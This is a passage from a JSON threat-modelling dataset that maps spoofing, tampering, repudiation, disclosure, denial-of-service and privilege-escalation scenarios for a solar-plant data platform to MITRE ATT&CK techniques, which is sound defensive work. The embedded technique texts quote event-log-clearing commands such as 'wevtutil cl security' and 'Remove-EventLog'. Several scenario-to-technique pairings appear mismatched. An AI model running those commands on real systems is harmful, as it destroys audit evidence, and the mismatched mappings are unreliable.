                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A contractor denies having changed configuration settings in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or tracked.",
                    "Role": "System Administrators",
                    "Condition": "No change management logs."
                },
                {
                    "Assumption": "There is no proper authorization process for configuration changes.",
                    "Role": "System Developers",
                    "Condition": "Inadequate change control mechanisms."
                },
                {
                    "Assumption": "Access to the systems is not uniquely tied to individual users.",
                    "Role": "System Administrators",
                    "Condition": "Shared or weak authentication practices."
                }
            ],
            "Potential Impact": "Difficulty in identifying and resolving unauthorized or erroneous changes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration changes",
                "logging",
                "authorization"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive sensor data is intercepted during transmission from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is unencrypted.",
                    "Role": "System Administrators",
                    "Condition": "Use of unencrypted protocols."
                },
                {
                    "Assumption": "The attacker has access to the network carrying the sensor data.",
                    "Role": "Attacker",
                    "Condition": "Network is compromised or insufficiently segmented."
                },
                {
                    "Assumption": "There is no monitoring for unusual network traffic patterns.",
                    "Role": "System Security",
                    "Condition": "Absence of network anomaly detection."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational and maintenance data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to pre-processed sensor data stored in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has valid credentials or finds a way to bypass the authentication.",
                    "Role": "Attacker",
                    "Condition": "Compromised access methods or vulnerabilities."
                },
                {
                    "Assumption": "Data is not encrypted at rest.",
                    "Role": "System Administrators",
                    "Condition": "Unencrypted database storage or file storage."
                },
                {
                    "Assumption": "There is no access logging or incident response mechanisms in place.",
                    "Role": "System Security",
                    "Condition": "Lack of detailed access monitoring and logging."
                }
            ],
            "Potential Impact": "Exposure of sensitive and potentially proprietary pre-processed sensor data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data access",
                "database",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits metadata within the system to infer sensitive information about solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is not properly anonymized or protected.",
                    "Role": "System Developers",
                    "Condition": "Insufficient anonymization and security protocols."
                },
                {
                    "Assumption": "Attacker has access to metadata storage or transmission channels.",
                    "Role": "Attacker",
                    "Condition": "Network or system access gained."
                },
                {
                    "Assumption": "There is no monitoring of metadata access and activity.",
                    "Role": "System Security",
                    "Condition": "Lack of metadata usage logs."
                }
            ],
            "Potential Impact": "Potential inference of confidential information about the operational and ownership status of power plants.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "anonymization",
                "security"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with traffic to disrupt communication between sensors and the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The network lacks sufficient DoS protection mechanisms.",
                    "Role": "System Administrators",
                    "Condition": "Absence of DoS mitigation tools."
                },
                {
                    "Assumption": "The attacker can generate a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to multiple compromised systems or high bandwidth."
                },
                {
                    "Assumption": "There are no redundant communication paths or failover mechanisms.",
                    "Role": "System Developers",
                    "Condition": "Single point of failure in network design."
                }
            ],
            "Potential Impact": "Disruption of data transmission, leading to loss of real-time monitoring and predictive maintenance capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DoS",
                "network disruption",
                "communication"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR platform to take the system offline.",
            "Assumptions": [
                {
                    "Assumption": "There is an unpatched vulnerability in the platform.",
                    "Role": "System Developers",
                    "Condition": "Delayed or inadequate vulnerability management."
                },
                {
                    "Assumption": "The attacker can reach the vulnerable component of the platform.",
                    "Role": "Attacker",
                    "Condition": "Platform is internet-facing with exposed services."
                },
                {
                    "Assumption": "There are no effective intrusion detection and prevention systems in place.",
                    "Role": "System Security",
                    "Condition": "Lack of detective and preventive controls."
                }
            ],
            "Potential Impact": "Complete loss of platform availability, affecting all predictive maintenance and optimization functions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "system disruption",
                "platform"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An internal actor executes resource-intensive queries on the Dashboard to render it unusable.",
            "Assumptions": [
                {
                    "Assumption": "User activity is not monitored or rate-limited.",
                    "Role": "System Administrators",
                    "Condition": "Lack of user action logging or limitations."
                },
                {
                    "Assumption": "There are no alerts for unusual resource consumption.",
                    "Role": "System Security",
                    "Condition": "No real-time performance monitoring."
                },
                {
                    "Assumption": "The system does not isolate user sessions effectively.",
                    "Role": "System Developers",
                    "Condition": "Single thread handling for user sessions."
                }
            ],
            "Potential Impact": "Dashboard becomes unresponsive, disrupting operational monitoring and decision-making processes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "dashboard",
                "internal threat"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a flaw to gain administrative access to the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "There is a security flaw in the Dashboard software.",
                    "Role": "System Developers",
                    "Condition": "Unpatched or zero-day vulnerability present."
                },
                {
                    "Assumption": "The attacker has a foothold in the network.",
                    "Role": "Attacker",
                    "Condition": "Existing network penetration."
                },
                {
                    "Assumption": "Administrative access does not have sufficient protection.",
                    "Role": "System Administrators",
                    "Condition": "Weak or absent multi-factor authentication for admin roles."
                }
            ],
            "Potential Impact": "Unrestricted access to sensitive data and system controls, potentially leading to data breaches and system misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploit",
                "administrative access",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with limited rights exploits a backend API vulnerability to escalate their privileges.",
            "Assumptions": [
                {
                    "Assumption": "Backend APIs have insufficient input validation and access controls.",
                    "Role": "System Developers",
                    "Condition": "Lack of rigorous input validation and authorization checks."
                },
                {
                    "Assumption": "The API is exposed to users without adequate monitoring.",
                    "Role": "System Administrators",
                    "Condition": "No logging or monitoring of API usage."
                },
                {
                    "Assumption": "Security patches and updates are delayed.",
                    "Role": "System Administrators",
                    "Condition": "Infrequent or delayed system updates."
                }
            ],
            "Potential Impact": "Unauthorized access and potential manipulation of sensitive system functions and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "API vulnerability",
                "access control",
                "backend"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a misconfigured server setting to gain higher privileges within the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Server configurations are not reviewed regularly.",
                    "Role": "System Administrators",
                    "Condition": "Lack of regular security audits."
                },
                {
                    "Assumption": "The attacker has enough access to identify and exploit the misconfiguration.",
                    "Role": "Attacker",
                    "Condition": "Existing network access and reconnaissance capability."
                },
                {
                    "Assumption": "There are no compensating controls to detect unusual privilege escalation activities.",
                    "Role": "System Security",
                    "Condition": "Absence of monitoring for privilege escalation attempts."
                }
            ],
            "Potential Impact": "Potential takeover of critical platform functionalities, affecting all operational aspects.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfiguration",
                "server",
                "platform"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the Dashboard by impersonating an authorized employee.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can obtain an authorized employee's login credentials.",
                    "Role": "Attacker",
                    "Condition": "Employee's login credentials are not properly secured."
                },
                {
                    "Assumption": "The system does not use multi-factor authentication.",
                    "Role": "System",
                    "Condition": "Only username and password are required for access."
                },
                {
                    "Assumption": "The employee's session is not actively monitored for abnormal behavior.",
                    "Role": "System",
                    "Condition": "Lack of behavior-based anomaly detection."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "User Account",
                "Valid Accounts"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious software on a compromised sensor sends false data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are not protected against malware.",
                    "Role": "System",
                    "Condition": "Inadequate endpoint security for sensors."
                },
                {
                    "Assumption": "The Data Logger doesn\u2019t verify the authenticity of the data source.",
                    "Role": "System",
                    "Condition": "Lack of mutual authentication between sensors and Data Logger."
                },
                {
                    "Assumption": "Network traffic between sensor and Data Logger is not encrypted.",
                    "Role": "System",
                    "Condition": "Plaintext communication over network."
                }
            ],
            "Potential Impact": "Incorrect predictive maintenance data leading to potential hardware failures and inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "Network Intrusion",
                "Data Manipulation",
                "Device"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the Anonymity (Anon) Agent to inject false data during pre-processing.",
            "Assumptions": [
                {
                    "Assumption": "Lack of mutual authentication between the Anon Agent and other components.",
                    "Role": "System",
                    "Condition": "Unauthorized component can interact with the system."
                },
                {
                    "Assumption": "Network traffic between devices is not adequately encrypted.",
                    "Role": "System",
                    "Condition": "Plaintext communication over network."
                },
                {
                    "Assumption": "The system doesn't validate incoming data thoroughly.",
                    "Role": "System",
                    "Condition": "Insufficient data validation mechanisms."
                }
            ],
            "Potential Impact": "Corruption of training data for AI/ML models, leading to inaccurate predictions.",
            "MITRE ATT&CK Keywords": [
                "Impersonation",
                "Man-in-the-Middle",
                "Data Injection"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data in transit between the Data Logger and the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between the Data Logger and Receiver are not encrypted.",
                    "Role": "System",
                    "Condition": "Plaintext data transmitted over network."
                },
                {
                    "Assumption": "The system does not employ integrity checks on received data.",
                    "Role": "System",
                    "Condition": "Lack of cryptographic hash functions or digital signatures."
                },
                {
                    "Assumption": "Attackers have network access.",
                    "Role": "Attacker",
                    "Condition": "Network segments are not adequately protected."
                }
            ],
            "Potential Impact": "Corrupted data could lead to inaccurate AI/ML model results and system malfunctions.",
            "MITRE ATT&CK Keywords": [
                "Network",
                "Data Tampering",
                "Injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies metadata in the TOREADOR Platform to circumvent maintenance alerts.",
            "Assumptions": [
                {
                    "Assumption": "Employees have direct access to metadata.",
                    "Role": "System",
                    "Condition": "Granular access control policies are not enforced."
                },
                {
                    "Assumption": "There are no activity logs or monitoring for changes to metadata.",
                    "Role": "System",
                    "Condition": "Lack of audit trails or monitoring solutions."
                },
                {
                    "Assumption": "Lack of separation of duties.",
                    "Role": "System",
                    "Condition": "Single employee can perform multiple critical operations."
                }
            ],
            "Potential Impact": "Incorrect maintenance schedules potentially leading to hardware failures.",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Data Modification",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
